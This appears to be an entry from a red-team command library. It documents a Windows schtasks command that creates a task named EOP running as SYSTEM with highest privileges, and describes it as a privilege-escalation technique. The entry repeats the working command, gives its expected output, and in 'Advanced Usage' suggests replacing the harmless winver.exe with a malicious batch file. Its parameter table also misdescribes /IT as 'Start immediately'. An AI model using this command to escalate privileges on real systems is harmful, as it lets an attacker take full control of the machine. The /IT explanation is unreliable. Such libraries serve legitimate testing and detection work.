---
id: schtasks-create-001
data: >-
  schtasks /create /SC WEEKLY /RU "NT AUTHORITY\SYSTEM" /TN EOP /TR
  C:\Windows\System32\winver.exe /IT /RL HIGHEST
tags:
  - escalation
  - scheduled-task
type: command
output: 'SUCCESS: The scheduled task "EOP" has successfully been created.'
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.078Z'
verified: false
validated: true
submitted: true
---
# schtasks-create-system-task

## Command

```cmd
schtasks /create /SC WEEKLY /RU "NT AUTHORITY\SYSTEM" /TN EOP /TR C:\Windows\System32\winver.exe /IT /RL HIGHEST
```

## Description

Creates a scheduled task that runs as NT AUTHORITY\SYSTEM with highest privileges, scheduled weekly but starting immediately, used for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /SC WEEKLY | Schedule type: weekly | Yes |
| /RU "NT AUTHORITY\SYSTEM" | Run as SYSTEM user | Yes |
| /TN EOP | Task name: EOP | Yes |
| /TR C:\Windows\System32\winver.exe | Action: execute winver.exe | Yes |
| /IT | Start immediately | Yes |
| /RL HIGHEST | Run with highest privileges | Yes |

## Examples

### Basic Usage

```cmd
schtasks /create /SC WEEKLY /RU "NT AUTHORITY\SYSTEM" /TN EOP /TR C:\Windows\System32\winver.exe /IT /RL HIGHEST
```

### Advanced Usage

Modify /TR for custom payload, e.g., /TR "cmd.exe /c malicious.bat"

## Expected Output

"SUCCESS: The scheduled task \"EOP\" has successfully been created."

## Related

- [[Related Procedure|procedures/Verify-Admin-Privileges-and-Escalate-to-SYSTEM]]
